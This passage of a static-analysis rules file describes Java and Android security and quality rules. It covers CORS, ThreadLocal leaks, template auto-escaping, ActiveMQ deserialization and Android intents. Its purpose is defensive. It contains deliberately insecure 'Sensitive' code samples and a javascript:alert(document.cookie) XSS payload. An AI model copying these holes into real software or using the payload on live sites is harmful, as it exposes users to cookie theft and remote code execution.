            href=&quot;https://docs.spring.io/spring-framework/docs/current/javadoc-api/org/springframework/web/bind/annotation/CrossOrigin.html&quot;&gt;CrossOrigin&lt;/a&gt;&lt;/p&gt;
            &lt;pre&gt;
            @CrossOrigin // Sensitive
            @RequestMapping(&quot;&quot;)
            public class TestController {
            public String home(ModelMap model) {
            model.addAttribute(&quot;message&quot;, &quot;ok &quot;);
            return &quot;view&quot;;
            }
            }
            &lt;/pre&gt;
            &lt;p&gt;&lt;a
            href=&quot;https://docs.spring.io/spring-framework/docs/current/javadoc-api/org/springframework/web/cors/CorsConfiguration.html&quot;&gt;cors.CorsConfiguration&lt;/a&gt;&lt;/p&gt;
            &lt;pre&gt;
            CorsConfiguration config = new CorsConfiguration();
            config.addAllowedOrigin(&quot;*&quot;); // Sensitive
            config.applyPermitDefaultValues(); // Sensitive
            &lt;/pre&gt;
            &lt;p&gt;&lt;a
            href=&quot;https://docs.spring.io/spring-framework/docs/current/javadoc-api/org/springframework/web/servlet/config/annotation/CorsRegistration.html&quot;&gt;servlet.config.annotation.CorsConfiguration&lt;/a&gt;&lt;/p&gt;
            &lt;pre&gt;
            class Insecure implements WebMvcConfigurer {
            @Override
            public void addCorsMappings(CorsRegistry registry) {
            registry.addMapping(&quot;/**&quot;)
            .allowedOrigins(&quot;*&quot;); // Sensitive
            }
            }
            &lt;/pre&gt;
            &lt;h2&gt;Compliant Solution&lt;/h2&gt;
            &lt;p&gt;Java Servlet framework:&lt;/p&gt;
            &lt;pre&gt;
            @Override
            protected void doGet(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException
            {
            resp.setHeader(&quot;Content-Type&quot;, &quot;text/plain; charset=utf-8&quot;);
            resp.setHeader(&quot;Access-Control-Allow-Origin&quot;, &quot;trustedwebsite.com&quot;); // Compliant
            resp.setHeader(&quot;Access-Control-Allow-Credentials&quot;, &quot;true&quot;);
            resp.setHeader(&quot;Access-Control-Allow-Methods&quot;, &quot;GET&quot;);
            resp.getWriter().write(&quot;response&quot;);
            }
            &lt;/pre&gt;
            &lt;p&gt;Spring MVC framework:&lt;/p&gt;
            &lt;p&gt;&lt;a
            href=&quot;https://docs.spring.io/spring-framework/docs/current/javadoc-api/org/springframework/web/bind/annotation/CrossOrigin.html&quot;&gt;CrossOrigin&lt;/a&gt;&lt;/p&gt;
            &lt;pre&gt;
            @CrossOrigin(&quot;trustedwebsite.com&quot;) // Compliant
            @RequestMapping(&quot;&quot;)
            public class TestController {
            public String home(ModelMap model) {
            model.addAttribute(&quot;message&quot;, &quot;ok &quot;);
            return &quot;view&quot;;
            }
            }
            &lt;/pre&gt;
            &lt;p&gt;&lt;a
            href=&quot;https://docs.spring.io/spring-framework/docs/current/javadoc-api/org/springframework/web/cors/CorsConfiguration.html&quot;&gt;cors.CorsConfiguration&lt;/a&gt;&lt;/p&gt;
            &lt;pre&gt;
            CorsConfiguration config = new CorsConfiguration();
            config.addAllowedOrigin(&quot;http://domain2.com&quot;); // Compliant
            &lt;/pre&gt;
            &lt;p&gt;&lt;a
            href=&quot;https://docs.spring.io/spring-framework/docs/current/javadoc-api/org/springframework/web/servlet/config/annotation/CorsRegistration.html&quot;&gt;servlet.config.annotation.CorsConfiguration&lt;/a&gt;&lt;/p&gt;
            &lt;pre&gt;
            class Safe implements WebMvcConfigurer {
            @Override
            public void addCorsMappings(CorsRegistry registry) {
            registry.addMapping(&quot;/**&quot;)
            .allowedOrigins(&quot;safe.com&quot;); // Compliant
            }
            }
            &lt;/pre&gt;
            &lt;h2&gt;See&lt;/h2&gt;
            &lt;ul&gt;
            &lt;li&gt; &lt;a href=&quot;https://developer.mozilla.org/en-US/docs/Web/HTTP/CORS&quot;&gt;developer.mozilla.org&lt;/a&gt;
            - CORS &lt;/li&gt;
            &lt;li&gt; &lt;a href=&quot;https://developer.mozilla.org/en-US/docs/Web/Security/Same-origin_policy&quot;&gt;developer.mozilla.org&lt;/a&gt;
            - Same origin policy &lt;/li&gt;
            &lt;li&gt; &lt;a href=&quot;https://www.owasp.org/index.php/Top_10-2017_A6-Security_Misconfiguration&quot;&gt;OWASP
            Top 10 2017 Category A6&lt;/a&gt; - Security
            Misconfiguration &lt;/li&gt;
            &lt;li&gt; &lt;a href=&quot;https://www.owasp.org/index.php/HTML5_Security_Cheat_Sheet#Cross_Origin_Resource_Sharing&quot;&gt;OWASP
            HTML5 Security Cheat Sheet&lt;/a&gt; - Cross
            Origin Resource Sharing &lt;/li&gt;
            &lt;li&gt; &lt;a href=&quot;https://cwe.mitre.org/data/definitions/346.html&quot;&gt;MITRE, CWE-346&lt;/a&gt;
            - Origin Validation Error &lt;/li&gt;
            &lt;li&gt; &lt;a href=&quot;https://cwe.mitre.org/data/definitions/942.html&quot;&gt;MITRE, CWE-942&lt;/a&gt;
            - Overly Permissive Cross-domain Whitelist &lt;/li&gt;
            &lt;li&gt; &lt;a href=&quot;https://www.sans.org/top25-software-errors/#cat3&quot;&gt;SANS Top 25&lt;/a&gt;
            - Porous Defenses &lt;/li&gt;
            &lt;/ul&gt;
        </description>
        <tag>cwe</tag>
        <tag>owasp-a6</tag>
        <tag>sans-top25-porous</tag>
        <tag>spring</tag>
        <securityStandards>
            <cwe>346,942</cwe>
            <OWASP>A6</OWASP>
        </securityStandards>
    </rule>

    <rule key='S5164' priority='MAJOR'>
        <configKey>S5164</configKey>
        <name>&quot;ThreadLocal&quot; variables should be cleaned up when no longer used</name>
        <description>
            &lt;p&gt;&lt;code&gt;ThreadLocal&lt;/code&gt; variables are supposed to be garbage collected once the
            holding thread is no longer alive. Memory leaks can occur when
            holding threads are re-used which is the case on application servers using pool of threads.&lt;/p&gt;
            &lt;p&gt;To avoid such problems, it is recommended to always clean up &lt;code&gt;ThreadLocal&lt;/code&gt;
            variables using the &lt;code&gt;remove()&lt;/code&gt; method to remove
            the current thread’s value for the &lt;code&gt;ThreadLocal&lt;/code&gt; variable.&lt;/p&gt;
            &lt;p&gt;In addition, calling &lt;code&gt;set(null)&lt;/code&gt; to remove the value might keep the
            reference to &lt;code&gt;this&lt;/code&gt; pointer in the map, which can cause
            memory leak in some scenarios. Using &lt;code&gt;remove&lt;/code&gt; is safer to avoid this issue.&lt;/p&gt;
            &lt;h2&gt;Noncompliant Code Example&lt;/h2&gt;
            &lt;pre&gt;
            public class ThreadLocalUserSession implements UserSession {

            private static final ThreadLocal&amp;lt;UserSession&amp;gt; DELEGATE = new ThreadLocal&amp;lt;&amp;gt;();

            public UserSession get() {
            UserSession session = DELEGATE.get();
            if (session != null) {
            return session;
            }
            throw new UnauthorizedException(&quot;User is not authenticated&quot;);
            }

            public void set(UserSession session) {
            DELEGATE.set(session);
            }

            public void incorrectCleanup() {
            DELEGATE.set(null); // Noncompliant
            }

            // some other methods without a call to DELEGATE.remove()
            }
            &lt;/pre&gt;
            &lt;h2&gt;Compliant Solution&lt;/h2&gt;
            &lt;pre&gt;
            public class ThreadLocalUserSession implements UserSession {

            private static final ThreadLocal&amp;lt;UserSession&amp;gt; DELEGATE = new ThreadLocal&amp;lt;&amp;gt;();

            public UserSession get() {
            UserSession session = DELEGATE.get();
            if (session != null) {
            return session;
            }
            throw new UnauthorizedException(&quot;User is not authenticated&quot;);
            }

            public void set(UserSession session) {
            DELEGATE.set(session);
            }

            public void unload() {
            DELEGATE.remove(); // Compliant
            }

            // ...
            }
            &lt;/pre&gt;
            &lt;h2&gt;Exceptions&lt;/h2&gt;
            &lt;p&gt;Rule will not detect non-private &lt;code&gt;ThreadLocal&lt;/code&gt; variables, because &lt;code&gt;remove()&lt;/code&gt;
            can be called from another class.&lt;/p&gt;
            &lt;h2&gt;See&lt;/h2&gt;
            &lt;ul&gt;
            &lt;li&gt; &lt;a href=&quot;https://www.baeldung.com/java-memory-leaks&quot;&gt;Understanding Memory Leaks
            in Java&lt;/a&gt; &lt;/li&gt;
            &lt;/ul&gt;
        </description>
        <tag>leak</tag>
        <tag>performance</tag>
    </rule>

    <rule key='S5247' priority='MAJOR'>
        <configKey>S5247</configKey>
        <name>Disabling auto-escaping in template engines is security-sensitive</name>
        <description>
            &lt;p&gt;To reduce the risk of cross-site scripting attacks, templating systems, such as &lt;code&gt;Twig&lt;/code&gt;,
            &lt;code&gt;Django&lt;/code&gt;, &lt;code&gt;Smarty&lt;/code&gt;,
            &lt;code&gt;Groovy's template engine&lt;/code&gt;, allow configuration of automatic variable escaping before
            rendering templates. When escape occurs, characters
            that make sense to the browser (eg: &amp;lt;a&amp;gt;) will be transformed/replaced with escaped/sanitized
            values (eg: &amp;amp; lt;a&amp;amp; gt; ).&lt;/p&gt;
            &lt;p&gt;Auto-escaping is not a magic feature to annihilate all cross-site scripting attacks, it depends on
            &lt;a
            href=&quot;https://twig.symfony.com/doc/3.x/filters/escape.html&quot;&gt;the strategy applied&lt;/a&gt; and
            the context, for example a &quot;html auto-escaping&quot; strategy
            (which only transforms html characters into &lt;a href=&quot;https://developer.mozilla.org/en-US/docs/Glossary/Entity&quot;&gt;html
            entities&lt;/a&gt;) will not be relevant
            when variables are used in a &lt;a href=&quot;https://en.wikipedia.org/wiki/HTML_attribute&quot;&gt;html
            attribute&lt;/a&gt; because '&lt;code&gt;:&lt;/code&gt;' character is not
            escaped and thus an attack as below is possible:&lt;/p&gt;
            &lt;pre&gt;
            &amp;lt;a href=&quot;{{ myLink }}&quot;&amp;gt;link&amp;lt;/a&amp;gt; // myLink =
            javascript:alert(document.cookie)
            &amp;lt;a href=&quot;javascript:alert(document.cookie)&quot;&amp;gt;link&amp;lt;/a&amp;gt; // JS injection
            (XSS attack)
            &lt;/pre&gt;
            &lt;h2&gt;Ask Yourself Whether&lt;/h2&gt;
            &lt;ul&gt;
            &lt;li&gt; Templates are used to render web content and
            &lt;ul&gt;
            &lt;li&gt; dynamic variables in templates come from untrusted locations or are user-controlled inputs &lt;/li&gt;
            &lt;li&gt; there is no local mechanism in place to sanitize or validate the inputs. &lt;/li&gt;
            &lt;/ul&gt; &lt;/li&gt;
            &lt;/ul&gt;
            &lt;p&gt;There is a risk if you answered yes to any of those questions.&lt;/p&gt;
            &lt;h2&gt;Recommended Secure Coding Practices&lt;/h2&gt;
            &lt;p&gt;Enable auto-escaping by default and continue to review the use of inputs in order to be sure that
            the chosen auto-escaping strategy is the right
            one.&lt;/p&gt;
            &lt;h2&gt;Sensitive Code Example&lt;/h2&gt;
            &lt;p&gt;With &lt;a href=&quot;https://github.com/samskivert/jmustache&quot;&gt;JMustache by samskivert&lt;/a&gt;:&lt;/p&gt;
            &lt;pre&gt;
            Mustache.compiler().escapeHTML(false).compile(template).execute(context); // Sensitive
            Mustache.compiler().withEscaper(Escapers.NONE).compile(template).execute(context); // Sensitive
            &lt;/pre&gt;
            &lt;p&gt;With &lt;a href=&quot;https://freemarker.apache.org/&quot;&gt;Freemarker&lt;/a&gt;:&lt;/p&gt;
            &lt;pre&gt;
            freemarker.template.Configuration configuration = new freemarker.template.Configuration();
            configuration.setAutoEscapingPolicy(DISABLE_AUTO_ESCAPING_POLICY); // Sensitive
            &lt;/pre&gt;
            &lt;h2&gt;Compliant Solution&lt;/h2&gt;
            &lt;p&gt;With &lt;a href=&quot;https://github.com/samskivert/jmustache&quot;&gt;JMustache by samskivert&lt;/a&gt;:&lt;/p&gt;
            &lt;pre&gt;
            Mustache.compiler().compile(template).execute(context); // Compliant, auto-escaping is enabled by default
            Mustache.compiler().escapeHTML(true).compile(template).execute(context); // Compliant
            &lt;/pre&gt;
            &lt;p&gt;With &lt;a href=&quot;https://freemarker.apache.org/&quot;&gt;Freemarker&lt;/a&gt;. See &lt;a
            href=&quot;https://freemarker.apache.org/docs/api/freemarker/template/Configuration.html#setAutoEscapingPolicy-int-&quot;&gt;&quot;setAutoEscapingPolicy&quot;
            documentation&lt;/a&gt; for more details. &lt;/p&gt;
            &lt;pre&gt;
            freemarker.template.Configuration configuration = new freemarker.template.Configuration();
            configuration.setAutoEscapingPolicy(ENABLE_IF_DEFAULT_AUTO_ESCAPING_POLICY); // Compliant
            &lt;/pre&gt;
            &lt;h2&gt;See&lt;/h2&gt;
            &lt;ul&gt;
            &lt;li&gt; &lt;a href=&quot;https://github.com/OWASP/CheatSheetSeries/blob/master/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.md&quot;&gt;OWASP
            Cheat
            Sheet&lt;/a&gt; - XSS Prevention Cheat Sheet &lt;/li&gt;
            &lt;li&gt; &lt;a href=&quot;https://www.owasp.org/index.php/Top_10-2017_A7-Cross-Site_Scripting_(XSS)&quot;&gt;OWASP
            Top 10 2017 Category A7&lt;/a&gt; - Cross-Site Scripting
            (XSS) &lt;/li&gt;
            &lt;li&gt; &lt;a href=&quot;https://cwe.mitre.org/data/definitions/79.html&quot;&gt;MITRE, CWE-79&lt;/a&gt;
            - Improper Neutralization of Input During Web Page Generation
            ('Cross-site Scripting') &lt;/li&gt;
            &lt;li&gt; &lt;a href=&quot;https://cwe.mitre.org/data/definitions/80.html&quot;&gt;MITRE, CWE-80&lt;/a&gt;
            - Improper Neutralization of Script-Related HTML Tags in a Web Page
            (Basic XSS) &lt;/li&gt;
            &lt;li&gt; &lt;a href=&quot;https://cwe.mitre.org/data/definitions/83.html&quot;&gt;MITRE, CWE-83&lt;/a&gt;
            - Improper Neutralization of Script in Attributes in a Web Page
            &lt;/li&gt;
            &lt;li&gt; &lt;a href=&quot;https://cwe.mitre.org/data/definitions/84.html&quot;&gt;MITRE, CWE-84&lt;/a&gt;
            - Improper Neutralization of Encoded URI Schemes in a Web Page &lt;/li&gt;
            &lt;/ul&gt;
        </description>
        <tag>cwe</tag>
        <tag>owasp-a7</tag>
        <securityStandards>
            <OWASP>A7</OWASP>
        </securityStandards>
    </rule>

    <rule key='S5261' priority='MAJOR'>
        <configKey>S5261</configKey>
        <name>&quot;else&quot; statements should be clearly matched with an &quot;if&quot;</name>
        <description>
            &lt;p&gt;The dangling &lt;code&gt;else&lt;/code&gt; problem appears when nested &lt;code&gt;if&lt;/code&gt;/&lt;code&gt;else&lt;/code&gt;&amp;nbsp;statements
            are written without curly braces. In
            this case, &lt;code&gt;else&lt;/code&gt; is associated with the nearest&amp;nbsp;&lt;code&gt;if&lt;/code&gt;
            but that is not always obvious and sometimes the indentation can also
            be misleading.&lt;/p&gt;
            &lt;p&gt;This rules reports &lt;code&gt;else&lt;/code&gt; statements that are difficult to understand,
            because they are inside nested &lt;code&gt;if&lt;/code&gt; statements without
            curly braces.&lt;/p&gt;
            &lt;p&gt;Adding curly braces can generally make the code clearer (see rule &lt;a
            href='/coding_rules#rule_key=java%3AS121'&gt;S121&lt;/a&gt; ), and in this situation of dangling &lt;code&gt;else&lt;/code&gt;,
            it
            really clarifies the intention of the code.&lt;/p&gt;
            &lt;h2&gt;Noncompliant Code Example&lt;/h2&gt;
            &lt;pre&gt;
            if (a)
            if (b)
            d++;
            else // Noncompliant, is the &quot;else&quot; associated with &quot;if(a)&quot; or &quot;if (b)&quot;? (the
            answer is &quot;if(b)&quot;)
            e++;
            &lt;/pre&gt;
            &lt;h2&gt;Compliant Solution&lt;/h2&gt;
            &lt;pre&gt;
            if (a) {
            if (b) {
            d++;
            }
            } else { // Compliant, there is no doubt the &quot;else&quot; is associated with &quot;if(a)&quot;
            e++;
            }
            &lt;/pre&gt;
            &lt;h2&gt;See&lt;/h2&gt;
            &lt;ul&gt;
            &lt;li&gt; &lt;a href=&quot;https://en.wikipedia.org/wiki/Dangling_else&quot;&gt;https://en.wikipedia.org/wiki/Dangling_else&lt;/a&gt;
            &lt;/li&gt;
            &lt;/ul&gt;
        </description>
        <tag>confusing</tag>
    </rule>

    <rule key='S5301' priority='MINOR'>
        <configKey>S5301</configKey>
        <name>&quot;ActiveMQConnectionFactory&quot; should not be vulnerable to malicious code deserialization</name>
        <description>
            &lt;p&gt;ActiveMQ can send/receive JMS Object messages (named ObjectMessage in ActiveMQ context) to comply
            with JMS specification. Internally, ActiveMQ
            relies on Java serialization mechanism for marshaling/unmashaling of the message payload. Deserialization
            based on data supplied by the user could
            lead to remote code execution attacks, where the structure of the serialized data is changed to modify the
            behavior of the object being
            unserialized.&lt;/p&gt;
            &lt;p&gt;To limit the risk to be victim of such attack, ActiveMQ 5.12.2+ enforces developers to explicitly
            whitelist packages that can be exchanged using
            ObjectMessages.&lt;/p&gt;
            &lt;h2&gt;Noncompliant Code Example&lt;/h2&gt;
            &lt;pre&gt;
            ActiveMQConnectionFactory factory = new ActiveMQConnectionFactory(&quot;tcp://localhost:61616&quot;);
            factory.setTrustAllPackages(true); // Noncompliant

            ActiveMQConnectionFactory factory = new ActiveMQConnectionFactory(&quot;tcp://localhost:61616&quot;);
            // no call to factory.setTrustedPackages(...);
            &lt;/pre&gt;
            &lt;h2&gt;Compliant Solution&lt;/h2&gt;
            &lt;pre&gt;
            ActiveMQConnectionFactory factory = new ActiveMQConnectionFactory(&quot;tcp://localhost:61616&quot;);
            factory.setTrustedPackages(Arrays.asList(&quot;org.mypackage1&quot;, &quot;org.mypackage2&quot;));
            &lt;/pre&gt;
            &lt;h2&gt;See&lt;/h2&gt;
            &lt;ul&gt;
            &lt;li&gt; &lt;a href=&quot;https://www.owasp.org/index.php/Top_10-2017_A8-Insecure_Deserialization&quot;&gt;OWASP
            Top 10 2017 Category A8&lt;/a&gt; - Insecure Deserialization
            &lt;/li&gt;
            &lt;li&gt; &lt;a href=&quot;https://cwe.mitre.org/data/definitions/502.html&quot;&gt;MITRE, CWE-502&lt;/a&gt;
            - Deserialization of Untrusted Data &lt;/li&gt;
            &lt;li&gt; &lt;a href=&quot;https://activemq.apache.org/objectmessage.html&quot;&gt;ActiveMQ ObjectMessage
            Security Advisory&lt;/a&gt; &lt;/li&gt;
            &lt;li&gt; &lt;a href=&quot;https://activemq.apache.org/security-advisories.data/CVE-2015-5254-announcement.txt&quot;&gt;CVE-2015-5254&lt;/a&gt;
            &lt;/li&gt;
            &lt;/ul&gt;
        </description>
        <tag>cwe</tag>
        <tag>owasp-a8</tag>
        <securityStandards>
            <OWASP>A8</OWASP>
        </securityStandards>
    </rule>

    <rule key='S5320' priority='CRITICAL'>
        <configKey>S5320</configKey>
        <name>Broadcasting intents is security-sensitive</name>
        <description>
            &lt;p&gt;In Android applications, broadcasting intents is security-sensitive. For example, it has led in the
            past to the following vulnerability:&lt;/p&gt;
            &lt;ul&gt;
            &lt;li&gt; &lt;a href=&quot;http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-9489&quot;&gt;CVE-2018-9489&lt;/a&gt;
            &lt;/li&gt;
            &lt;/ul&gt;
            &lt;p&gt;By default, broadcasted intents are visible to every application, exposing all sensitive
            information they contain.&lt;/p&gt;
            &lt;p&gt;This rule raises an issue when an intent is broadcasted without specifying any &quot;receiver
            permission&quot;.&lt;/p&gt;
            &lt;h2&gt;Ask Yourself Whether&lt;/h2&gt;
            &lt;ul&gt;
            &lt;li&gt; The intent contains sensitive information. &lt;/li&gt;
            &lt;li&gt; Intent reception is not restricted. &lt;/li&gt;
            &lt;/ul&gt;
            &lt;p&gt;There is a risk if you answered yes to any of those questions.&lt;/p&gt;
            &lt;h2&gt;Recommended Secure Coding Practices&lt;/h2&gt;
            &lt;p&gt;Restrict the access to broadcasted intents. See &lt;a
            href=&quot;https://developer.android.com/guide/components/broadcasts.html#restricting_broadcasts_with_permissions&quot;&gt;Android
            documentation&lt;/a&gt; for more
            information.&lt;/p&gt;
            &lt;h2&gt;Sensitive Code Example&lt;/h2&gt;
            &lt;pre&gt;
            import android.content.BroadcastReceiver;
            import android.content.Context;
            import android.content.Intent;
            import android.os.Build;
            import android.os.Bundle;
            import android.os.Handler;
            import android.os.UserHandle;
            import android.support.annotation.RequiresApi;

            public class MyIntentBroadcast {
            @RequiresApi(api = Build.VERSION_CODES.JELLY_BEAN_MR1)
            public void broadcast(Intent intent, Context context, UserHandle user,
            BroadcastReceiver resultReceiver, Handler scheduler, int initialCode,
            String initialData, Bundle initialExtras,
            String broadcastPermission) {
            context.sendBroadcast(intent); // Sensitive
            context.sendBroadcastAsUser(intent, user); // Sensitive

            // Broadcasting intent with &quot;null&quot; for receiverPermission
            context.sendBroadcast(intent, null); // Sensitive
            context.sendBroadcastAsUser(intent, user, null); // Sensitive
            context.sendOrderedBroadcast(intent, null); // Sensitive
            context.sendOrderedBroadcastAsUser(intent, user, null, resultReceiver,
            scheduler, initialCode, initialData, initialExtras); // Sensitive

            context.sendBroadcast(intent, broadcastPermission); // Ok
            context.sendBroadcastAsUser(intent, user, broadcastPermission); // Ok
            context.sendOrderedBroadcast(intent, broadcastPermission); // Ok
            context.sendOrderedBroadcastAsUser(intent, user,broadcastPermission, resultReceiver,
            scheduler, initialCode, initialData, initialExtras); // Ok
            }
            }
            &lt;/pre&gt;
            &lt;h2&gt;See&lt;/h2&gt;
            &lt;ul&gt;
            &lt;li&gt; &lt;a href=&quot;https://www.owasp.org/index.php/Top_10-2017_A3-Sensitive_Data_Exposure&quot;&gt;OWASP
            Top 10 2017 Category A3&lt;/a&gt; - Sensitive Data Exposure
            &lt;/li&gt;
            &lt;li&gt; &lt;a href=&quot;https://cwe.mitre.org/data/definitions/927.html&quot;&gt;MITRE, CWE-927&lt;/a&gt;
            - Use of Implicit Intent for Sensitive Communication &lt;/li&gt;
            &lt;li&gt; &lt;a href=&quot;https://developer.android.com/guide/components/broadcasts.html#restricting_broadcasts_with_permissions&quot;&gt;Android
            documentation&lt;/a&gt; -
            Broadcast Overview - Security considerations and best practices &lt;/li&gt;
            &lt;/ul&gt;
        </description>
        <tag>android</tag>
        <tag>cwe</tag>
        <tag>owasp-a3</tag>
        <securityStandards>
            <cwe>927</cwe>
            <owasp>A3</owasp>
        </securityStandards>
    </rule>

    <rule key='S5322' priority='CRITICAL'>
        <configKey>S5322</configKey>
        <name>Receiving intents is security-sensitive</name>
        <description>
            &lt;p&gt;In Android applications, receiving intents is security-sensitive. For example, it has led in the
            past to the following vulnerability:&lt;/p&gt;
            &lt;ul&gt;
            &lt;li&gt; &lt;a href=&quot;http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-1677&quot;&gt;CVE-2019-1677&lt;/a&gt;
            &lt;/li&gt;
            &lt;li&gt; &lt;a href=&quot;http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2015-1275&quot;&gt;CVE-2015-1275&lt;/a&gt;
            &lt;/li&gt;
            &lt;/ul&gt;
            &lt;p&gt;Once a receiver is registered, any app can broadcast potentially malicious intents to your
            application.&lt;/p&gt;
            &lt;p&gt;This rule raises an issue when a receiver is registered without specifying any &quot;broadcast
            permission&quot;.&lt;/p&gt;
            &lt;h2&gt;Ask Yourself Whether&lt;/h2&gt;
            &lt;ul&gt;
            &lt;li&gt; The data extracted from intents is not sanitized. &lt;/li&gt;
            &lt;li&gt; Intents broadcast is not restricted. &lt;/li&gt;
            &lt;/ul&gt;
            &lt;p&gt;There is a risk if you answered yes to any of those questions.&lt;/p&gt;
            &lt;h2&gt;Recommended Secure Coding Practices&lt;/h2&gt;
            &lt;p&gt;Restrict the access to broadcasted intents. See &lt;a
            href=&quot;https://developer.android.com/guide/components/broadcasts.html#restricting_broadcasts_with_permissions&quot;&gt;Android
            documentation&lt;/a&gt; for more
            information.&lt;/p&gt;
            &lt;h2&gt;Sensitive Code Example&lt;/h2&gt;
            &lt;pre&gt;
            import android.content.BroadcastReceiver;
            import android.content.Context;
            import android.content.IntentFilter;
            import android.os.Build;
            import android.os.Handler;
            import android.support.annotation.RequiresApi;

            public class MyIntentReceiver {

            @RequiresApi(api = Build.VERSION_CODES.O)
            public void register(Context context, BroadcastReceiver receiver,
            IntentFilter filter,
            String broadcastPermission,
            Handler scheduler,
            int flags) {
            context.registerReceiver(receiver, filter); // Sensitive
            context.registerReceiver(receiver, filter, flags); // Sensitive

            // Broadcasting intent with &quot;null&quot; for broadcastPermission
            context.registerReceiver(receiver, filter, null, scheduler); // Sensitive
            context.registerReceiver(receiver, filter, null, scheduler, flags); // Sensitive


            context.registerReceiver(receiver, filter,broadcastPermission, scheduler); // OK
            context.registerReceiver(receiver, filter,broadcastPermission, scheduler, flags); // OK
            }
            }
            &lt;/pre&gt;
            &lt;h2&gt;See&lt;/h2&gt;
            &lt;ul&gt;
            &lt;li&gt; &lt;a href=&quot;https://www.owasp.org/index.php/Top_10-2017_A1-Injection&quot;&gt;OWASP Top 10
            2017 Category A1&lt;/a&gt; - Injection &lt;/li&gt;
            &lt;li&gt; &lt;a href=&quot;https://cwe.mitre.org/data/definitions/925.html&quot;&gt;MITRE, CWE-925&lt;/a&gt;
            - Improper Verification of Intent by Broadcast Receiver &lt;/li&gt;
            &lt;li&gt; &lt;a href=&quot;https://www.sans.org/top25-software-errors/#cat1&quot;&gt;SANS Top 25&lt;/a&gt;
            - Insecure Interaction Between Components &lt;/li&gt;
            &lt;li&gt; &lt;a href=&quot;https://developer.android.com/guide/components/broadcasts.html#restricting_broadcasts_with_permissions&quot;&gt;Android
            documentation&lt;/a&gt; -
            Broadcast Overview - Security considerations and best practices &lt;/li&gt;
            &lt;/ul&gt;
        </description>
        <tag>android</tag>
        <tag>cwe</tag>
        <tag>owasp-a1</tag>
        <tag>sans-top25-insecure</tag>
        <securityStandards>
            <cwe>925</cwe>
            <OWASP>A1</OWASP>
        </securityStandards>
    </rule>

    <rule key='S5324' priority='CRITICAL'>
        <configKey>S5324</configKey>
        <name>Accessing Android external storage is security-sensitive</name>
        <description>
            &lt;p&gt;In Android applications, accessing external storage is security-sensitive. For example, it has led
            in the past to the following vulnerability:&lt;/p&gt;
            &lt;ul&gt;
            &lt;li&gt; &lt;a href=&quot;http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-15004&quot;&gt;CVE-2018-15004&lt;/a&gt;
            &lt;/li&gt;
            &lt;li&gt; &lt;a href=&quot;http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-15002&quot;&gt;CVE-2018-15002&lt;/a&gt;
            &lt;/li&gt;
            &lt;li&gt; &lt;a href=&quot;http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-14995&quot;&gt;CVE-2018-14995&lt;/a&gt;
            &lt;/li&gt;
            &lt;/ul&gt;
            &lt;p&gt;Any application having the permissions &lt;code&gt;WRITE_EXTERNAL_STORAGE&lt;/code&gt; or &lt;code&gt;READ_EXTERNAL_STORAGE&lt;/code&gt;
            can access files stored on an
            external storage, be it a private or a public file.&lt;/p&gt;
            &lt;p&gt;This rule raises an issue when the following functions are called:&lt;/p&gt;
            &lt;ul&gt;
            &lt;li&gt; &lt;code&gt;android.os.Environment.getExternalStorageDirectory&lt;/code&gt; &lt;/li&gt;
            &lt;li&gt; &lt;code&gt;android.os.Environment.getExternalStoragePublicDirectory&lt;/code&gt; &lt;/li&gt;
            &lt;li&gt; &lt;code&gt;android.content.Context.getExternalFilesDir&lt;/code&gt; &lt;/li&gt;
            &lt;li&gt; &lt;code&gt;android.content.Context.getExternalFilesDirs&lt;/code&gt; &lt;/li&gt;
            &lt;li&gt; &lt;code&gt;android.content.Context.getExternalMediaDirs&lt;/code&gt; &lt;/li&gt;
            &lt;li&gt; &lt;code&gt;android.content.Context.getExternalCacheDir&lt;/code&gt; &lt;/li&gt;
            &lt;li&gt; &lt;code&gt;android.content.Context.getExternalCacheDirs&lt;/code&gt; &lt;/li&gt;
            &lt;li&gt; &lt;code&gt;android.content.Context.getObbDir&lt;/code&gt; &lt;/li&gt;
            &lt;li&gt; &lt;code&gt;android.content.Context.getObbDirs&lt;/code&gt; &lt;/li&gt;
            &lt;/ul&gt;
            &lt;h2&gt;Ask Yourself Whether&lt;/h2&gt;
            &lt;ul&gt;
            &lt;li&gt; Data written to the external storage is security-sensitive and is not encrypted. &lt;/li&gt;
            &lt;li&gt; Data read from files is not validated. &lt;/li&gt;
            &lt;/ul&gt;
            &lt;p&gt;There is a risk if you answered yes to any of those questions.&lt;/p&gt;
            &lt;h2&gt;Recommended Secure Coding Practices&lt;/h2&gt;
            &lt;p&gt;Validate any data read from files.&lt;/p&gt;
            &lt;p&gt;Avoid writing sensitive information to an external storage. If this is required, make sure that the
            data is encrypted properly.&lt;/p&gt;
            &lt;h2&gt;Sensitive Code Example&lt;/h2&gt;
            &lt;pre&gt;
            import android.content.Context;
            import android.os.Environment;

            public class AccessExternalFiles {

            public void accessFiles(Context context) {
            Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_PICTURES); // Sensitive
            context.getExternalFilesDir(Environment.DIRECTORY_PICTURES); // Sensitive
            }
            }
            &lt;/pre&gt;
            &lt;h2&gt;See&lt;/h2&gt;
            &lt;ul&gt;
            &lt;li&gt; &lt;a href=&quot;https://developer.android.com/training/articles/security-tips#ExternalStorage&quot;&gt;Android
            Security tips on external file storage&lt;/a&gt;
            &lt;/li&gt;
            &lt;li&gt; &lt;a href=&quot;https://www.owasp.org/index.php/Top_10-2017_A1-Injection&quot;&gt;OWASP Top 10
            2017 Category A1&lt;/a&gt; - Injection &lt;/li&gt;
            &lt;li&gt; &lt;a href=&quot;https://www.owasp.org/index.php/Top_10-2017_A3-Sensitive_Data_Exposure&quot;&gt;OWASP
            Top 10 2017 Category A3&lt;/a&gt; - Sensitive Data Exposure
            &lt;/li&gt;
            &lt;li&gt; &lt;a href=&quot;https://cwe.mitre.org/data/definitions/312.html&quot;&gt;MITRE, CWE-312&lt;/a&gt;
            - Cleartext Storage of Sensitive Information &lt;/li&gt;
            &lt;li&gt; &lt;a href=&quot;https://cwe.mitre.org/data/definitions/20.html&quot;&gt;MITRE, CWE-20&lt;/a&gt;
            - Improper Input Validation &lt;/li&gt;
